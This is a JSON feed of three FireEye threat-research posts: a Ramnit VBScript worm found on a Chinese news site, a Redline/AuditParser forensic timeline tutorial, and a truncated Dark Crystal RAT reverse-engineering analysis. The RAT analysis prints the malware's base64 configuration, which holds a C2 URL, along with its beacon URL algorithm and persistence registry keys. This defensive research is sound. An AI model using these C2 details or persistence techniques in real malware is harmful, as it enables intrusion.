{"code":1,"isDone":false,"toInsertArticleList":[{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Maimed Ramnit Still Lurking in the Shadow","link":"http://www.fireeye.com/blog/threat-research/2016/02/maimed_ramnit_still.html","description":"<p>Newspapers have the ability to do more than simply keep us current with worldly affairs; we can use them to squash bugs! Yet, as we move from waiting on the newspaper delivery boy to reading breaking news on <i>e</i>Papers, we lose the subtle art of bug squashing. Instead, we end up exposing ourselves to dangerous digital bugs that can affect our virtual worlds.</p> \n<p>This is exactly what happened to visitors of one of the top five news sites of China. Any users running Internet Explorer (IE) who navigated to the website may have been exposed to an old, yet persistent VBScript worm that has the ability to self-replicate recursively from infected machines. Incidentally, the major actors involved with this old campaign have been taken down, yet traces of their injected recursive malware have still managed to sneak on to one of the highest browsed sites in China.</p> \n<p>The <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/products-delete/dynamic-threat-intelligence.html\">FireEye Dynamic Threat Intelligence (DTI)</a> first discovered that the site was compromised and used to host VBS/Ramnit on Jan. 28, 2016. We can confirm that the infection is still live as of the time of this writing. IE users who visit the site may be compromised if they browse to a specific page (paperindex[.]htm) and click ‘Yes’ to run ActiveX, which may appear to be safe since the website is familiar and popular. There is no exploit used for infection, simply social engineering and errant clicks.</p> \n<p>As shown in Figure 1, a malicious VBScript is appeneded after the HTML body. Upon landing on this page, the victim’s browser will load the news content while it executes a malicious ActiveX component in the background.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ramnit%20Hsu/figure1.png\" /> <span class=\"type-XS\">Figure 1: Legitimate HTML page appended with malicious VBScript</span></p> \n<p>As shown in Figure 2 and Figure 3, the VBScript drops a binary named “svchost.exe” in the %TEMP% folder and executes it upon successful ActiveX execution. In a case where the system is compromised, it also tries to connect to a CnC server, fget-career[.]com, which has been involved in campaigns for this trojan before.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ramnit%20Hsu/figure2.png\" /> <span class=\"type-XS\">Figure 2: The VBScript drops the binary in the %TEMP% folder and executes it</span></p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ramnit%20Hsu/figure3.png\" /> <span class=\"type-XS\">Figure 3: The full path to “svchost.exe” (using Internet Explorer 11 on Windows 7)</span></p> \n<p>Successful execution of the VBScript and the delivery of W32.Ramnit onto the victim’s machine depends on the user’s browser, as well as the browser’s setting. Since Chrome and Firefox do not support client-side VBScript, only IE users are susceptible to this attack.</p> \n<p>Fortunately, recent versions of IE do not run code automatically by default. Instead, users will see two popup warnings when the browser is rendering potentially dangerous objects such as ActiveX components, as shown in Figure 4 and Figure 5.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ramnit%20Hsu/figure4.png\" /> <span class=\"type-XS\">Figure 4: First warning for blocked content in IE 11</span></p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ramnit%20Hsu/figure5.png\" /> <span class=\"type-XS\">Figure 5: Second warning for blocked content in IE 11</span></p> \n<p>Only when the victim clicks on “Yes” will the browser execute the blocked content. In this case, the IE executes the VBScript, drops the payload, and executes it in the background while the user simply sees the usual news page.</p> \n<p>As long as users click “No” to disallow ActiveX components, they will remain safe from W32.Ramnit. However, this type of social engineering continues to be successful. When a legitimate site is compromised to host exploits or malware, the positive reputation of the site is leveraged to trick users into clicking “Yes” and becoming infected. The potential impact of this particular threat is compounded by the fact that the compromised site is ranked in the Alexa Top 100 for most visited sites internationally, and is in the <a target=\"_blank\" href=\"http://www.alexa.com\">Top 25 for most popular websites in China</a> [1].</p> \n<p>FireEye appliances detect this infection at multiple levels. FireEye’s multiflow detection traces out the complete attack chain, as well as CnC communication. While the CnC host has been suspended for a long time, the worm’s presence alone can be a pain for the victim because it adds itself into all HTML files that it can access. Additionally, it adds itself to the startup registry and impacts the machine’s performance.</p> \n<p>So the question that you need to ask yourself is this: If a Top 100 Alexa domain is still infected by this veteran malware, are you?</p>","descriptionType":"html","publishedDate":"Thu, 18 Feb 2016 17:00:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ramnit%20Hsu/figure1.png","linkMd5":"2af09e34ff28e74e3812cc258aa83bdc","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn99@2020_5/2020/08/24/14-11-06-469_9a0cc461b94f19af.webp","destWidth":1624,"destHeight":822,"sourceBytes":83198,"destBytes":174670,"author":"Zain Gardezi ","articleImgCdnMap":{"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ramnit%20Hsu/figure1.png":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn99@2020_5/2020/08/24/14-11-06-469_9a0cc461b94f19af.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ramnit%20Hsu/figure2.png":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn81@2020_6/2020/08/24/14-11-15-857_b69f2eefc98e0e38.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ramnit%20Hsu/figure3.png":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn35@2020_2/2020/08/24/14-11-16-213_ab73ff40e9bc8dcd.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ramnit%20Hsu/figure4.png":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn22@2020_1/2020/08/24/14-11-17-299_e7f2fae8ee19d3e3.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ramnit%20Hsu/figure5.png":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn43@2020_6/2020/08/24/14-11-18-376_37d9baf09865e0d4.webp"},"publishedOrCreatedDate":1598278264198},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Using AuditParser to Process and Analyze Large Volumes of Data Collected\nwith Redline","link":"http://www.fireeye.com/blog/threat-research/2012/10/auditparser-process-analyze-large-volumes-data-collected.html","description":"<div class=\"c00 c00v1\"> \n <p>In this blog post, I am going to show you some ways to review data that have been collected with the <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/redline.html\">Mandiant Redline</a>™ tool, without using the Redline interface. I will be using Mandiant's AuditParser™ tool in order to transform the Redline audit XML into tab separated data. This will let you take data and view it in different ways, as well as perform timeline analysis on data you have collected. I will focus on using data collected by a Redline Portable collector, which was configured to perform a Comprehensive Collection. The AuditParser tool will also work with audit data that have been collected with the MIR Agent, or with <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/ioc-finder.html\">IOCFinder</a>™.</p> \n <p>Timeline analysis can be an important technique when performing an investigation on a system. It involves taking data from several sources, in this case, Redline audit data, and sorting it chronologically. This allows an analyst to see numerous data sources in a chronological fashion, allowing multiple, discrete events to be correlated together. I will be demonstrating timeline analysis, with AuditParser, on a system that is infected with malware.</p> \n <p>The first item I want to show is how AuditParser converts audit data to the tab separated files. Once you've got the AuditParser tool, you can run it, and point to the directory of audit data that you have collected with Redline. There is also a Windows executable version of this tool available, if you do not have access to Python.</p> \n <p> <code>C:Documents and SettingsUserDesktopAuditParser&gt;python AuditParser.py -i ..LR_Collection -o ..Processed_Audits<br /> Parsing input file: ..LR_Collectionmir.w32apifiles.1176360b.xml<br /> Parsing input file: ..LR_Collectionmir.w32eventlogs.771e480e.xml<br /> Parsing input file: ..LR_Collectionmir.w32registryapi.3e2e3e42.xml<br /> Parsing input file: ..LR_Collectionmir.w32scripting-persistence.27091e25.xml<br /> ...</code></p> \n <p>This will output a set of files in ..Processed_Audits, which are the tab separated files, one for each audit in the input.</p> \n <p> <code>C:Documents and SettingsUserDesktopAuditParser&gt;dir ..Processed_Audits<br /> Directory of C:Documents and SettingsUserDesktopIndividual_Audits<br /> 10/19/2012 08:56 PM <br /> 20,385,250 mir.w32apifiles.1176360b.xml.txt<br /> 10/19/2012 08:56 PM <br /> 592,829 mir.w32eventlogs.771e480e.xml.txt<br /> 10/19/2012 09:00 PM <br /> 48,625,256 mir.w32registryapi.3e2e3e42.xml.txt<br /> 10/19/2012 09:01 PM <br /> 301,325 mir.w32scripting-persistence.27091e25.xml.txt<br /> ...</code></p> \n <p>Now that you have these files parsed, you can start performing analysis with any software that supports processing tab separated files, such as Microsoft Excel or Apache OpenOffice. This lets you quickly sort and filter data you have collected and quickly look for anomalies. Below is a screenshot of the output of the Persistence audit. The persistence audit combines the File, Registry and Services audit to look for executable files that will persistently run on a system. Each of the columns - denoting information collected from the Registry, Filesystem and Services - can be filtered in order to perform an investigative analysis.</p> \n <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Image-1.png\"><img width=\"879\" height=\"394\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Image-1.png\" class=\" wp-image-3612\" /></a>Click to enlarge image\n <p>If you sort by files that do not have digital signatures (Column: Signature Exists, select 'False'), one entry is found. This is a serviceDLL entry. This indicates that there is an unsigned service running on this system. The Persistence audit gives you some information you can use to further analysis. It gives the location to the file on the file system, the file owner, a hash of the file, Registry path &amp; value information. The file full path, <a href=\"http://www.microsoft.com/security/portal/Threat/Encyclopedia/Entry.aspx?name=TROJAN:WIN32/TROOTI\">\"c:WINDOWSimewmimachine2.dll\"</a> is not a typical location for a service DLL, so this item is definitely something worth investigating.</p> \n <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Image-2.png\"><img width=\"1021\" height=\"33\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Image-2.png\" class=\" wp-image-3613\" /></a>Click to enlarge image\n <p>You could continue reviewing data in individual audits using some of the information presented in the Persistence audit module. In fact, there is some additional information contained in the XML for the persistence item, pertaining to the file 'wmimachine2.dll.' Continuing with the individual audits would be familiar sorting and filtering operations, so that will be skipped for now. Instead, what I'm going to show next is how to timeline the audit data that we have already collected in order to identify other items of interest which have occurred around the creation of our malicious serviceDLL. In order to do this, I will rerun the AuditParser tool with the timeline switches.</p> \n <p> <code>C:Documents and SettingsUserDesktopAuditParser&gt;python AuditParser.py -i ..LR_Collection -o ..Processed_Audits<br /> ed -t --starttime 2012-10-18T00:00:00Z --endtime 2012-10-21T00:00:00Z</code></p> \n <p>This will rerun AuditParser, regenerating the .txt files you already have processed and creating a new file, timeline.txt. This is a tab separated file that contains a timeline of File, Registry, Event Log, Url History, Process Item and Prefetch audit data. I picked a date range of 2012-10-18 through 2012-10-20 to timeline.</p> \n <p>Here is a screenshot of timelined data:</p> \n <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Image-3.png\"><img width=\"919\" height=\"482\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Image-3.png\" class=\" wp-image-3614\" /></a>Click to enlarge image\n <p>You can see that we timeline on multiple timestamps for each item. For instance, a file can have up to eight different timestamps (API + NTFS timestamps), and the AuditParser tool will create an entry for each of those timestamps.</p> \n <p>From the Persistence audit data, you can see the file created date is \"2012-10-20T01:06:55Z\". You can start by narrowing down the date range of items displayed by filtering the date with the string '2012-10-20T01'. This will show you all of the activity on 2012-10-20 between 01:00:00Z and 01:59:59Z. Below is a screenshot of some activity around the time of interest.</p> \n <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Image-41.png\"><img width=\"901\" height=\"383\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Image-41.png\" class=\" wp-image-3616\" /></a>Click to enlarge image\n <p>If you look through the data, you can see that there was a file staged in C:Recycler, named 'scvhost.exe'. This was likely executed with a command shell, cmd.exe. After scvhost.exe was executed, you can see the Eventlog record the service start for the \".NET Runtime Optimization Service v2.086521.BackUp_X86\" service. Further down, you can see artifacts in the registry where the '6to4' service has been hijacked and used to host this new, malicious service. Here you can see the how the registry has been timelined, and shows the Paths and Values.</p> \n <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Image-5.png\"><img width=\"922\" height=\"167\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Image-5.png\" class=\" wp-image-3617\" /></a>Click to enlarge image\n <p>This does not necessarily finish the investigation of this host. Malware analysis may need to be performed on the malware 'scvhost.exe' and 'wmimachine2.dll' in order to identify additional host-based and network-based indicators of compromise. The source of 'scvhost.exe' has not been identified, so that would require further investigation.</p> \n <p>Hopefully, this demonstration of using AuditParser to process Redline audit data has been helpful, showing a new way to process and analyze the large volume of data that can be collected with Redline. The timeline capability of AuditParser can be a powerful analysis tool. If they are not already, Redline and AuditParser should become part of your investigative toolkit. You can download each tool <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/redline.html\">here</a> (Redline) and <a href=\"https://github.com/mandiant/AuditParser\">here</a> (AuditParser).</p> \n</div>","descriptionType":"html","publishedDate":"Wed, 24 Oct 2012 20:12:42 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/legacy/ammo/Image-1.png","linkMd5":"c12a9fa577292d775bc71472df47143f","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn57@2020_5/2020/08/24/14-11-05-008_77705e0519f2ef19.webp","destWidth":1876,"destHeight":841,"sourceBytes":115586,"destBytes":317288,"author":"Will Gibb","articleImgCdnMap":{"https://www.fireeye.com/content/dam/legacy/ammo/Image-1.png":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn57@2020_5/2020/08/24/14-11-05-008_77705e0519f2ef19.webp","https://www.fireeye.com/content/dam/legacy/ammo/Image-2.png":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn27@2020_5/2020/08/24/14-11-08-783_3d9804654d395669.webp","https://www.fireeye.com/content/dam/legacy/ammo/Image-3.png":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn23@2020_2/2020/08/24/14-11-19-282_e0d05fa3f63ed0c4.webp","https://www.fireeye.com/content/dam/legacy/ammo/Image-41.png":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn69@2020_6/2020/08/24/14-11-14-617_cee6aa091001ebbf.webp","https://www.fireeye.com/content/dam/legacy/ammo/Image-5.png":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn87@2020_2/2020/08/24/14-11-18-346_fc66c498630b1887.webp"},"publishedOrCreatedDate":1598278264216},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Analyzing Dark Crystal RAT, a C# Backdoor","link":"http://www.fireeye.com/blog/threat-research/2020/05/analyzing-dark-crystal-rat-backdoor.html","description":"<p>The <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/threat-intelligence.html\">FireEye Mandiant Threat Intelligence Team</a> helps protect our customers by tracking cyber attackers and the malware they use. The FLARE Team helps augment our threat intelligence by reverse engineering malware samples. Recently, FLARE worked on a new C# variant of Dark Crystal RAT (DCRat) that the threat intel team passed to us. We reviewed open source intelligence and prior work, performed sandbox testing, and reverse engineered the Dark Crystal RAT to review its capabilities and communication protocol. Through publishing this blog post we aim to help defenders look for indicators of compromise and other telltale signs of Dark Crystal RAT, and to assist fellow malware researchers new to .NET malware, or who encounter future variants of this sample.</p> \n<h4>Discovering Dark Crystal RAT</h4> \n<p>The threat intel team provided FLARE with an EXE sample, believed to contain Dark Crystal RAT, and having the MD5 hash b478d340a787b85e086cc951d0696cb1. Using sandbox testing, we found that this sample produced two executables, and in turn, one of those two executables produced three more. Figure 1 shows the relationships between the malicious executables discovered via sandbox testing.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure1.png\" alt=\"\" /> <span class=\"type-XS\"> <br /> Figure 1: The first sample we began analyzing ultimately produced five executables.</span></p> \n<p>Armed with the sandbox results, our next step was to perform a triage analysis on each executable. We found that the original sample and mnb.exe were droppers, that dal.exe was a clean-up utility to delete the dropped files, and that daaca.exe and fsdffc.exe were variants of Plurox, a family with existing reporting. Then we moved to analyzing the final dropped sample, which was dfsds.exe. We found brief public reporting by @<i>James_inthe_box </i>on the same sample, <a href=\"https://twitter.com/James_inthe_box/status/1178275531692756992?s=20\">identifying it as DCRat and as a RAT and credential stealer</a>. We also found a <a href=\"https://app.any.run/tasks/01a715ca-6a34-4350-b3ba-d1daae1e3d16/\">public sandbox run</a> that included the same sample. Other public reporting <a href=\"https://tccontre.blogspot.com/2019/10/dcrat-malware-evades-sandbox-that-use.html\">described DCRat, but actually analyzed the daaca.exe Plurox component</a> bundled along with DCRat in the initial sample.</p> \n<p>Satisfied that dfsds.exe was a RAT lacking detailed public reporting, we decided to perform a deeper analysis.</p> \n<h4>Analyzing Dark Crystal RAT</h4> \n<h5>Initial Analysis</h5> \n<p>Shifting aside from our sandbox for a moment, we performed static analysis on dfsds.exe. We chose to begin static analysis using CFF Explorer, a good tool for opening a PE file and breaking down its sections into a form that is easy to view. Having viewed dfsds.exe in CFF Explorer, as shown in Figure 2, the utility showed us that it is a .NET executable. This meant we could take a much different path to analyzing it than we would on a native C or C++ sample. Techniques we might have otherwise used to start narrowing down a native sample’s functionality, such as looking at what DLLs it imports and what functions from those DLLs that it uses, yielded no useful results for this .NET sample. As shown in Figure 3, dfsds.exe imports only the function <span class=\"code\">_CorExeMain</span> from mscoree.dll. We could have opened dfsds.exe in IDA Pro, but IDA Pro is usually not the most effective way of analyzing .NET samples; in fact, the free version of IDA Pro cannot handle .NET Common Language Infrastructure (CLI) intermediate code.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure2.png\" alt=\"\" /> <span class=\"type-XS\"> <br /> Figure 2: CFF Explorer shows that dfsds.exe is a .NET executable.</span></p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure3.png\" alt=\"\" /> <span class=\"type-XS\"> <br /> Figure 3: The import table for dfsds.exe is not useful as it contains only one function.</span></p> \n<p>Instead of using a disassembler like IDA Pro on dfsds.exe, we used a .NET decompiler. Luckily for the reverse engineer, decompilers operate at a higher level and often produce a close approximation of the original C# code. dnSpy is a great .NET decompiler. dnSpy’s interface displays a hierarchy of the sample’s namespaces and classes in the Assembly Explorer and shows code for the selected class on the right. Upon opening dfsds.exe, dnSpy told us that the sample’s original name at link time was DCRatBuild.exe, and that its entry point is at <span class=\"code\">&lt;PrivateImplementationDetails&gt;{63E52738-38EE-4EC2-999E-1DC99F74E08C}.Main</span>, shown in Figure 4. When we browsed to the Main method using the Assembly Explorer, we found C#-like code representing that method in Figure 5. Wherever dnSpy displays a call to another method in the code, it is possible to click on the target method name to go to it and view its code. By right-clicking on an identifier in the code, and clicking Analyze in the context menu, we caused dnSpy to look for all occurrences where the identifier is used, similar to using cross-references in IDA Pro.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure4.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 4: dnSpy can help us locate the sample's entry point</span></p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure5.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 5: dnSpy decompiles the Main method into C#-like code</span></p> \n<p>We went to the <span class=\"code\">SchemaServerManager.Main</span> method that is called from the entry point method, and observed that it makes many calls to <span class=\"code\">ExporterServerManager.InstantiateIndexer</span> with different integer arguments, as shown in Figure 6. We browsed to the <span class=\"code\">ExporterServerManager.InstantiateIndexer</span> method, and found that it is structured as a giant switch statement with many goto statements and labels; Figure 7 shows an excerpt. This does not look like typical dnSpy output, as dnSpy often reconstructs a close approximation of the original C# code, albeit with the loss of comments and local variable names. This code structure, combined with the fact that the code refers to the <span class=\"code\">CipherMode.CBC</span> constant, led us to believe that <span class=\"code\">ExporterServerManager.InstantiateIndexer</span> may be a decryption or deobfuscation routine. Therefore, dfsds.exe is likely obfuscated. Luckily, .NET developers often use obfuscation tools that are somewhat reversible through automated means.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure6.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 6: SchemaServerManager.Main makes many calls to ExporterServerManager.InstantiateIndexer</span></p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure7.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 7: ExporterServerManager.InstantiateIndexer looks like it may be a deobfuscation routine</span></p> \n<h5>Deobfuscation</h5> \n<p>De4dot is a .NET deobfuscator that knows how to undo many types of obfuscations. Running de4dot -d (for detect) on dfsds.exe (Figure 8) informed us that .NET Reactor was used to obfuscate it.</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><p> <span class=\"code\">&gt; de4dot -d dfsds.exe</span></p> <p> <span class=\"code\">de4dot v3.1.41592.3405 Copyright (C) 2011-2015 de4dot@gmail.com<br /> Latest version and source code: https://github.com/0xd4d/de4dot</span></p> <p> <span class=\"code\">Detected .NET Reactor (C:\\...\\dfsds.exe)</span></p> </td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Figure 8: dfsds.exe is obfuscated with .NET Reactor</span></p> \n<p>After confirming that de4dot can deobfuscate dfsds.exe, we ran it again to deobfuscate the sample into the file dfsds_deob.exe (Figure 9).</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><p> <span class=\"code\">&gt; de4dot -f dfsds.exe -o dfsds_deob.exe</span></p> <p> <span class=\"code\">de4dot v3.1.41592.3405 Copyright (C) 2011-2015 de4dot@gmail.com<br /> Latest version and source code: https://github.com/0xd4d/de4dot</span></p> <p> <span class=\"code\">Detected .NET Reactor (C:\\Users\\user\\Desktop\\intelfirst\\dfsds.exe)<br /> Cleaning C:\\Users\\user\\Desktop\\intelfirst\\dfsds.exe<br /> Renaming all obfuscated symbols<br /> Saving C:\\Users\\user\\Desktop\\intelfirst\\dfsds_deob.exe</span></p> </td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Figure 9: de4dot successfully deobfuscates dfsds.exe</span></p> \n<p>After deobfuscating dfsds.exe, we ran dnSpy again on the resulting dfsds_deob.exe. When we decompiled <span class=\"code\">SchemaServerManager.Main</span> again, the results were much different, as shown in Figure 10. Contrasting the new output with the obfuscated version shown previously in Figure 6, we found the deobfuscated code much more readable. In the deobfuscated version, all the calls to <span class=\"code\">ExporterServerManager.InstantiateIndexer</span> were removed; as suspected, it was apparently a string decoding routine. In contrast, the class names shown in the Assembly Explorer did not change; the obfuscator must have irrecoverably replaced the original class names with meaningless ones obtained from a standard list. Next, we noted that ten lines in Figure 10 hold base64-encoded data. Once the sample was successfully deobfuscated, it was time to move on to extracting its configuration and to follow the sample’s code path to its persistence capabilities and initial beacon.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure10.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 10: Deobfuscating dfsds.exe shows that the method begins with some path manipulation and then accesses Base64-encoded data</span></p> \n<h5>Configuration, Persistence and Initial Beacon</h5> \n<p>Recall that in Figure 10 we found that the method <span class=\"code\">SchemaServerManager.Main</span> has a local variable containing Base64-encoded data; decoding that data revealed what it contains. Figure 11 shows the decoded configuration (with C2 endpoint URLs de-fanged):</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><p> <span class=\"code\">&gt; echo TUhvc3Q6aHR0cDovL2RvbWFsby5vbmxpbmUva3NlemJseGx2b3Uza2NtYnE4bDdoZjNmNGN5NXhnZW<br /> 80dWRsYTkxZHVldTNxYTU0LzQ2a3FianZ5a2x1bnAxejU2dHh6a2hlbjdnamNpM2N5eDhnZ2twdHgy<br /> NWk3NG1vNm15cXB4OWtsdnYzL2FrY2lpMjM5bXl6b24weHdqbHhxbm4zYjM0dyxCSG9zdDpodHRwOi<br /> 8vZG9tYWxvLm9ubGluZS9rc2V6Ymx4bHZvdTNrY21icThsN2hmM2Y0Y3k1eGdlbzR1ZGxhOTFkdWV1<br /> M3FhNTQvNDZrcWJqdnlrbHVucDF6NTZ0eHpraGVuN2dqY2kzY3l4OGdna3B0eDI1aTc0bW82bXlxcH<br /> g5a2x2djMvYWtjaWkyMzlteXpvbjB4d2pseHFubjNiMzR3LE1YOkRDUl9NVVRFWC13TGNzOG8xTlZF<br /> VXRYeEo5bjl5ZixUQUc6VU5ERUY= | base64 -d</span></p> <p> <span class=\"code\">MHost:hxxp://domalo[.]online/ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54/<br /> 46kqbjvyklunp1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9klvv3/akcii239myzon0xwjl<br /> xqnn3b34w,BHost:hxxp://domalo[.]online/ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91<br /> dueu3qa54/46kqbjvyklunp1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9klvv3/akcii239<br /> myzon0xwjlxqnn3b34w,MX:DCR_MUTEX-wLcs8o1NVEUtXxJ9n9yf,TAG:UNDEF</span></p> </td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Figure 11: Decoding the base64 data in SchemaServerManager.Main reveals a configuration string</span></p> \n<p>Figure 11 shows that the data decoded to a configuration string containing four values: MHost, BHost, MX, and TAG. We analyzed the code that parses this string and found that MHost and BHost were used as its main and backup command and control (C2) endpoints. Observe that the MHost and BHost values in Figure 11 are identical, so this sample did not have a backup C2 endpoint.</p> \n<p>In dnSpy it is possible to give classes and methods meaningful names just as it is possible to name identifiers in IDA Pro. For example, the method <span class=\"code\">SchemaServerManager.StopCustomer</span> picks the name of a random running process. By right-clicking the <span class=\"code\">StopCustomer</span> identifier and choosing Edit Method, it is possible to change the method name to <span class=\"code\">PickRandomProcessName</span>, as shown in Figure 12.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure12.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 12: Assigning meaningful names to methods makes it easier to keep analyzing the program</span></p> \n<p>Continuing to analyze the <span class=\"code\">SchemaServerManager.Main</span> method revealed that the sample persists across reboots. The persistence algorithm can be summarized as follows:</p> \n<ol> \n <li>The malware picks the name of a random running process, and then copies itself to <span class=\"code\">%APPDATA%</span> and <span class=\"code\">C:\\</span>. For example, if svchost.exe is selected, then the malware copies itself to <span class=\"code\">%APPDATA%\\svchost.exe</span> and <span class=\"code\">C:\\svchost.exe</span>.</li> \n <li>The malware creates a shortcut <span class=\"code\">%APPDATA%\\dotNET.lnk</span> pointing to the copy of the malware under <span class=\"code\">%APPDATA%</span>.</li> \n <li>The malware creates a shortcut named dotNET.lnk in the logged-on user’s Startup folder pointing to <span class=\"code\">%APPDATA%\\dotNET.lnk</span>.</li> \n <li>The malware creates a shortcut <span class=\"code\">C:\\Sysdll32.lnk</span> pointing to the copy of the malware under <span class=\"code\">C:\\</span>.</li> \n <li>The malware creates a shortcut named Sysdll32.lnk in the logged-on user’s Startup folder pointing to <span class=\"code\">C:\\Sysdll32.lnk</span>.</li> \n <li>The malware creates the registry value <span class=\"code\">HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\scrss</span> pointing to <span class=\"code\">%APPDATA%\\dotNET.lnk</span>.</li> \n <li>The malware creates the registry value <span class=\"code\">HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Wininit</span> pointing to <span class=\"code\">C:\\Sysdll32.lnk</span>.</li> \n</ol> \n<p>After its persistence steps, the malware checks for multiple instances of the malware:</p> \n<ol> \n <li>The malware sleeps for a random interval between 5 and 7 seconds.</li> \n <li>The malware takes the MD5 hash of the still-base64-encoded configuration string, and creates the mutex whose name is the hexadecimal representation of that hash. For this sample, the malware creates the mutex <span class=\"code\">bc2dc004028c4f0303f5e49984983352</span>. If this fails because another instance is running, the malware exits.</li> \n</ol> \n<p>The malware then beacons, which also allows it to determine whether to use the main host (MHost) or backup host (BHost). To do so, the malware constructs a beacon URL based on the MHost URL, makes a request to the beacon URL, and then checks to see if the server responds with the HTTP response body “ok.” If the server does not send this response, then the malware unconditionally uses the BHost; this code is shown in Figure 13. Note that since this sample has the same MHost and BHost value (from Figure 11), the malware uses the same C2 endpoint regardless of whether the check succeeds or fails.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure13.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 13: The malware makes an HTTP request based on the MHost URL to determine whether to use the MHost or BHost</span></p> \n<p>The full algorithm to obtain the beacon URL is as follows:</p> \n<ol> \n <li>Obtain the MHost URL, i.e., <span class=\"code\">hxxp://domalo[.]online/ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54<br /> /46kqbjvyklunp1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9klvv3/akcii239my<br /> zon0xwjlxqnn3b34w</span>.</li> \n <li>Calculate the SHA1 hash of the full MHost URL, i.e., 56743785cf97084d3a49a8bf0956f2c744a4a3e0.</li> \n <li>Remove the last path component from the MHost URL, and then append the SHA1 hash from above, and ?data=active. The full beacon URL is therefore <span class=\"code\">hxxp://domalo[.]online/ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54<br /> /46kqbjvyklunp1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9klvv3/56743785cf<br /> 97084d3a49a8bf0956f2c744a4a3e0.php?data=active</span>.</li> \n</ol> \n<p>After beaconing the malware proceeds to send and receive messages with the configured C2.</p> \n<h3>Messages and Capabilities</h3> \n<p>After performing static analysis of dfsds.exe to determine how it selects the C2 endpoint and confirming the C2 endpoint URL, we shifted to dynamic analysis in order to collect sample C2 traffic and make it easier to understand the code that generates and accepts C2 messages. Luckily for our analysis, the malware continues to generate requests to the C2 endpoint even if the server does not send a valid response. To listen for and intercept 